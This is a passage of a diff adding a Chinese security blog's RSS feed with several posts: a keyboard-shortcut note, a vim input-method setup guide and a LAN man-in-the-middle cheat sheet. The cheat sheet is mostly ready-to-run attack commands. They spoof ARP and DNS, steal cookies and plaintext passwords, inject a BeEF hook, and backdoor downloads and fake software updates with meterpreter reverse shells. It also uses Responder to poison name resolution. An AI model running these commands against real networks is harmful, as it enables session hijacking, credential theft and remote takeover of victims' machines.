+        参考http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/
+        方向用上面链接中的快捷键:
+        command+control+hjkl
+
+    以下只在终端有效
+    ctrl+&amp;amp;:恢复被上面删除的内容
+    ctrl+r:向前搜索运行过的命令
+    ctrl+s:向后搜索运行过的命令
+    ctrl+y:粘贴上面删除的内容
+    ctrl+p:上一个命令
+    ctrl+n:下一个命令
+
+    最后系统下的所有快捷键更全版本见如下链接,本文只记录与hhkb相关的快捷键
+        http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sat, 20 May 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/auxilary/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/</link>
+        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/</guid>
+        
+        <category>HHKB</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
+    
+      <item>
+        <title>vim中英文输入法自动切换完美方案</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;about:
+    解决vim下的中英文输入法切换的问题
+
+测试环境:
+    系统:macOS sierra(win和linux没有测试,理论上也支持)
+    应用:MacVim(同样适用于vim)
+    键盘:HHKB PRO BT(同样适用于普通键盘)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+使用squirrel输入法(笔者使用输入法轨迹:squirrel-&amp;gt;百度五笔-&amp;gt;squirrel)
+    在squirrel的配置文件(~/Library/Rime/default.custom.yaml)中设置一个按键绑定为按了esc后使用英文输入:
+    {accept: Escape, toggle: ascii_mode, when: always}
+
+tip:例如笔者的~/Library/Rime/default.custom.yaml文件内容如下设置:
+
+    patch:
+      schema_list:
+        - schema: wubi_pinyin
+      ascii_composer:
+        good_old_caps_lock: true
+        switch_key:
+          Shift_L: commit_code
+      key_binder:
+        bindings:
+          - {accept: Escape, toggle: ascii_mode, when: always}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-tips&quot;&gt;0x02 Tips&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---&amp;gt;建议将control键设置为按一下为esc,按住为control&amp;lt;---
+
+hint:这样设置的好处太多,macOS下设置方法为使用keyboard maestro设置,如果不会可参考
+http://3xp10it.cc/web/2017/05/20/HHKB-BT键盘设置/
+
+windows及linux下由于没有keyboard maestro软件所以需要找到替代的可以设置按键设置的工具
+
+按照建议设置后效果:
+1.在insert模式下按一下control键可直接从insert模式转成normal模式,此外还会自动将输入法转成squirrel
+的英文输入模式
+2.control的组合键不受影响
+3.这里的建议也可不参考,不影响自动切换中英文输入法的效果
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03-快速通道macos-only&quot;&gt;0x03 快速通道(macOS only)&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;普通非root用户
+登录进操作系统后运行(图形界面登录)
+wget https://raw.githubusercontent.com/3xp10it/mytools/master/autoSquirrel.py -O /tmp/autoSquirrel.py &amp;amp;&amp;amp; python3 /tmp/autoSquirrel.py
+
+hint:这里原来可以少写一些字符如下的:
+wget -O - https://raw.githubusercontent.com/3xp10it/mytools/master/autoSquirrel.py | python3
+但是实际发现由于autoSquirrel.py文件中有与用户交互的函数(input),这样运行会报错
+
+root用户则需如下步骤:
+a)以非root用户登录进操作系统后运行(图形界面登录):
+wget https://raw.githubusercontent.com/3xp10it/mytools/master/autoSquirrel.py -O /tmp/autoSquirrel.py &amp;amp;&amp;amp; python3 /tmp/autoSquirrel.py
+
+b)再切换成root用户登录进操作系统后(图形界面登录):
+添加须管鼠输入法到系统输入法中,重新部署squirrel,再用https://github.com/neolee/SCU设置好并重新部署(eg.设置终端和MacVim下不只为ascii)
+然后运行：
+wget https://raw.githubusercontent.com/3xp10it/AutoIM/master/default.custom.yaml -O ~/Library/Rime/default.custom.yaml
+
+c)重新部署squirrel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Fri, 19 May 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/vim/2017/05/19/vim%E4%B8%AD%E8%8B%B1%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E5%AE%8C%E7%BE%8E%E6%96%B9%E6%A1%88/</link>
+        <guid isPermaLink="true">http://localhost:4000/vim/2017/05/19/vim%E4%B8%AD%E8%8B%B1%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E5%AE%8C%E7%BE%8E%E6%96%B9%E6%A1%88/</guid>
+        
+        <category>vim</category>
+        
+        <category>输入法自动切换</category>
+        
+        
+        <category>vim</category>
+        
+      </item>
+    
+      <item>
+        <title>内网中间人玩法备忘录</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录内网中间人的玩法
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-欺骗方法&quot;&gt;0x01 欺骗方法&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)ettercap
+    ettercap -Tqi eth0 -M arp /ip// /ip//
+b)arpspoof
+    echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
+    arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
+        让受害者以为自己是网关
+    arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
+        让网关以为自己是受害者
+c)mitmf
+    mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-利用原理&quot;&gt;0x02 利用原理&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03-不同组合&quot;&gt;0x03 不同组合&lt;/h3&gt;
+
+&lt;h4 id=&quot;0xa-ettercapferrethamster&quot;&gt;0xa ettercap+ferret+hamster&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:监听cookie达到会话劫持的目的
+
+1.ettercap:让数据经过本机网卡
+ettercap -Tqi eth0 -M arp /192.168.1.1// ///
+    欺骗路由器192.168.1.1和其他机器的通话
+    ettercap -Tqi eth0 -M arp /// ///
+        欺骗任意两台机器之间的通话
+    ettercap -Tqi eth0 -M arp /192.168.1.101// /192.168.1.1//
+        欺骗192.168.1.101和路由器192.168.1.101之间的通话
+
+2.ferret:取cookie
+ferret -i eth0
+    kali(x64)没有ferret,需要如下命令安装:
+    dpkg --add-architecture i386 &amp;amp;&amp;amp; apt-get clean &amp;amp;&amp;amp; apt-get update &amp;amp;&amp;amp; apt-get upgrade -y &amp;amp;&amp;amp; apt-get dist-upgrade -y &amp;amp;&amp;amp; aptitude install ferret-sidejack:i386
+
+3.hamster:利用cookie
+hamster
+    需要设置浏览器的代理为127.0.0.1:1234,并在浏览器中访问http://hamster
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xb-cain&quot;&gt;0xb cain&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取密码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xc-arpspoofdsniff&quot;&gt;0xc arpspoof+dsniff&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取明文密码
+echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 192.168.1.101 192.168.1.1   欺骗192.168.1.101
+    [arpspoof -i eth0 192.168.1.1    欺骗所有机器]
+dsniff(new terminal)
+
+类似于cain的效果,但是测试不能截到http表单中的密码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xd-ettercapdriftnet&quot;&gt;0xd ettercap+driftnet&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取图片
+
+ettercap -Tqi eth0 -M arp /192.168.1.1// ///
+driftnet -i eth0 -a -d /tmp/output/
+    或driftnet -f file.pcap -a -d /tmp/output/(这里需要中间人欺骗后wireshark抓包)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xe-ettercapiefirefoxchromesafari漏洞&quot;&gt;0xe ettercap+ie(firefox,chrome,safari)漏洞&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取shell
+
+vim /etc/ettercap/etter.conf
+    编辑将euid和egid设置为0,并设置使用iptables或是ipchains,设置完成后再运行下面的命令,或者参考如下
+        https://www.youtube.com/watch?v=tW_NMG2IZ5s
+
+vim /etc/ettercap/etter.dns
+    添加* A 192.168.1.101在开始设置解析的地方
+
+ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
+    ettercap -P list可查看支持的插件
+    这里用的是dns欺骗插件
+
+msf设置利用ie漏洞或其他浏览器的漏洞
+    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xf-mitmfbeef&quot;&gt;0xf mitmf+beef&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:控制浏览器
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --hsts --inject --js-url http://192.168.1.104:3000/hook.js
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xg-mitmfmsf&quot;&gt;0xg mitmf+msf&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取shell
+
+msfconsole
+use multi/hanlder
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.106
+set lport 4444
+exploit
+
+msfconsole(another terminal)
+load msgrpc Pass=abc123
+如果到这里报错无法连接msfrpc则根据需要修改/etc/mitmf/mitmf.conf中的与msfrpc相关的设置(端口或密码)
+
+vi /etc/mitmf/mitmf.conf
+    eg.相关设置如下
+            [[[[WindowsIntelx86]]]]
+			PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+			# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
+			PATCH_METHOD = automatic
+			HOST = 192.168.0.106
+			PORT = 4444
+			# SHELL for use with automatic PATCH_METHOD
+			SHELL = iat_reverse_tcp_inline_threaded
+			# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+			SUPPLIED_SHELLCODE = None
+			ZERO_CERT = True
+			# PATCH_DLLs as they come across
+			PATCH_DLL = False
+			# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
+			RUNAS_ADMIN = False
+			# XP_MODE  - to support XP targets
+			XP_MODE = True
+			# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
+			#  with PATCH_METHOD 'replace' use an EXE not DLL
+			SUPPLIED_BINARY = veil_go_payload.exe
+			MSFPAYLOAD = windows/meterpreter/reverse_tcp
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --filepwn(欺骗192.168.1.101)
+    mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn(欺骗c段)
+    如果报错则要根据官网最接安装方法重新安装
+    https://github.com/byt3bl33d3r/MITMf/wiki/Installation
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xh-evilgrade&quot;&gt;0xh evilgrade&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取shell
+
+1.kali下没有安装evilgrade需要:
+apt-get install isr-evilgrade,如果没成功则用最新版kali安装即可
+evilgrade
+show modules
+conf notepadplus
+show options
+set agent '[&quot;%out....&quot;]'//这里参考youtube视频,设置agent为生成的shell的存放路径
+start
+
+2.ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
+    设置notepadplus的更新地址[上面evilgrade中的show options中的vhost的域名]的A记录解析到攻击者所在机器
+
+3.msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 4444
+set lhost xxx.xxx.xxx.xxx
+exploit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xi-responder&quot;&gt;0xi responder&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取系统登录明文密码
+
+./Responder.py -I eth0 -wrf
+
+detail:
+responder是一个LLMNR, NBT-NS and MDNS poisoner,可参考如下link：
+https://github.com/SpiderLabs/Responder
+https://mp.weixin.qq.com/s/ij4olS8GrYr7L-4LFGpQxg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Tue, 16 May 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/05/16/%E5%86%85%E7%BD%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E7%8E%A9%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/05/16/%E5%86%85%E7%BD%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E7%8E%A9%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
+        
+        <category>中间人</category>
+        
+        <category>内网</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>PHP中的内存破坏漏洞利用学习(2nd)</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;学习乌云中的&amp;lt;&amp;lt;PHP中的内存破坏漏洞利用&amp;gt;&amp;gt;
+link:http://cb.drops.wiki/drops/tips-4988.html
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Mon, 15 May 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/05/15/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(2nd)/</link>
+        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/05/15/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(2nd)/</guid>
+        
+        <category>php</category>
+        
+        <category>内存破坏</category>
+        
+        
+        <category>二进制</category>
+        
+      </item>
+    
+  </channel>
+</rss>
